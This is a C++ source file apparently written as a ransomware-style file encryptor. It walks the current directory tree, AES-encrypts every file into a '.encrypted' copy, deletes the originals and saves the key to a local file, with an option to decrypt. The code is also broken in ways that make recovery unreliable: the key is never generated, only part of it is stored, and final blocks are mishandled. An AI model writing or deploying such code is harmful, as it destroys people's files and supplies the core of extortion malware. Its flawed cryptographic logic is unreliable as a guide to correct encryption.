#include <cryptopp/aes.h>
#include <cryptopp/misc.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <io.h>
#include <iostream>
#include <ostream>
#include <string>

#pragma comment(lib, "cryptlib.h")

using namespace std;
using namespace CryptoPP;

const char *keys = "keyfile";

int GetAllFiles(string path, vector<string> &files) {
  intptr_t hFile = 0;
  struct _finddata_t fileinfo;
  string p;
  if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) !=
      -1) {
    do {
      if (strstr(fileinfo.name, "encoder") != NULL ||
          strstr(fileinfo.name, "keyfile")) {
        continue;
      }
      if ((fileinfo.attrib & _A_SUBDIR)) {
        if (strcmp(fileinfo.name, ".") != 0 &&
            strcmp(fileinfo.name, "..") != 0) {
          GetAllFiles(p.assign(path).append("\\").append(fileinfo.name), files);
        }
      } else {
        files.push_back(p.assign(path).append("\\").append(fileinfo.name));
      }
    } while (_findnext(hFile, &fileinfo) == 0);

    _findclose(hFile);
  }
  return 0;
}

int GetEncryptoFiles(string path, vector<string> &files) {
  intptr_t hFile = 0;
  struct _finddata_t fileinfo;
  string p;
  if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) !=
      -1) {
    do {
      if ((fileinfo.attrib & _A_SUBDIR)) {
        if (strcmp(fileinfo.name, ".") != 0 &&
            strcmp(fileinfo.name, "..") != 0) {
          GetAllFiles(p.assign(path).append("\\").append(fileinfo.name), files);
        }
      } else {
        if (strstr(fileinfo.name, "encrypted") != NULL) {
          files.push_back(p.assign(path).append("\\").append(fileinfo.name));
        }
      }
    } while (_findnext(hFile, &fileinfo) == 0);

    _findclose(hFile);
  }
  return 0;
}

int readkey(unsigned char key[], const char *source) {
  FILE *KEY = fopen(source, "rb");
  if (KEY == NULL) {
    exit(0);
  }
  fread(key, sizeof(char), AES::BLOCKSIZE, KEY);
  fclose(KEY);
  return 0;
}

int storekey(char *aeskey, const char *des) {
  FILE *KEY = fopen(des, "wb");
  if (KEY == NULL) {
    exit(0);
  }
  fwrite(aeskey, sizeof(aeskey), 1, KEY);
  fclose(KEY);
  return 0;
}

int Fileencrypto(string Filesource, AESEncryption aesEncryptor) {
  FILE *source, *des;

  string Filedes = Filesource + ".encrypted";

  // open the file
  if ((source = fopen(Filesource.c_str(), "rb+")) == NULL ||
      (des = fopen(Filedes.c_str(), "wb+")) == NULL) {
    printf("FILE OPEN ERROR");
    exit(0);
  }

  unsigned char inBlock[AES::BLOCKSIZE];
  unsigned char outBlock[AES::BLOCKSIZE];
  unsigned char xorBlock[AES::BLOCKSIZE];
  memset(xorBlock, 0, AES::BLOCKSIZE);

  size_t sourceReaded = 0;

  while (1) {

    sourceReaded = fread(inBlock, sizeof(char), AES::BLOCKSIZE, source);

    if (sourceReaded == 0) {
      break;
    }

    aesEncryptor.ProcessAndXorBlock(inBlock, xorBlock, outBlock);

    fwrite(outBlock, AES::BLOCKSIZE, 1, des);
  }
  fclose(des);
  fclose(source);
  remove(Filesource.c_str());

  return 0;
}

int Filedecode(string Filesource, AESDecryption aesDecryptor) {
  FILE *source, *des;
  string Filedes = Filesource.substr(0, Filesource.length() - 10);

  // open the file
  if ((source = fopen(Filesource.c_str(), "rb+")) == NULL ||
      (des = fopen(Filedes.c_str(), "wb+")) == NULL) {
    printf("FILE OPEN ERROR");
    exit(0);
  }

  unsigned char inBlock[AES::BLOCKSIZE];
  unsigned char outBlock[AES::BLOCKSIZE];
  unsigned char xorBlock[AES::BLOCKSIZE];
  memset(xorBlock, 0, AES::BLOCKSIZE);

  size_t sourceReaded = 0;

  while (1) {

    sourceReaded = fread(inBlock, sizeof(char), AES::BLOCKSIZE, source);

    if (sourceReaded == 0) {
      break;
    }

    aesDecryptor.ProcessAndXorBlock(inBlock, xorBlock, outBlock);

    fwrite(outBlock, AES::BLOCKSIZE, 1, des);
  }

  fclose(des);
  fclose(source);
  remove(Filesource.c_str());

  return 0;
}

int main() {
  vector<string> files;
  char filepath[100];
  getcwd(filepath, 100);
  unsigned char aesKey[AES::DEFAULT_KEYLENGTH];

  int choice = 1;
  cout << "type 1 for encrypt and 2 for decrypt (default: 1)" << endl;
  cin >> choice;

  if (choice == 2) {
    AESDecryption aesDecryptor;
    readkey(aesKey, keys);
    aesDecryptor.SetKey(aesKey, AES::DEFAULT_KEYLENGTH);

    GetEncryptoFiles(string(filepath), files);
    for (int i = 0; i < files.size(); i++) {
      cout << files[i] << endl;
      cout << "start decode" << endl;
      Filedecode(files[i], aesDecryptor);
    }
  } else {
    AESEncryption aesEncryptor;
    aesEncryptor.SetKey(aesKey, AES::DEFAULT_KEYLENGTH);

    GetAllFiles(string(filepath), files);
    for (int i = 0; i < files.size(); i++) {
      cout << files[i] << endl;
      cout << "start encrypto" << endl;
      Fileencrypto(files[i], aesEncryptor);
    }

    storekey((char *)aesKey, keys);
  }
  return 0;
}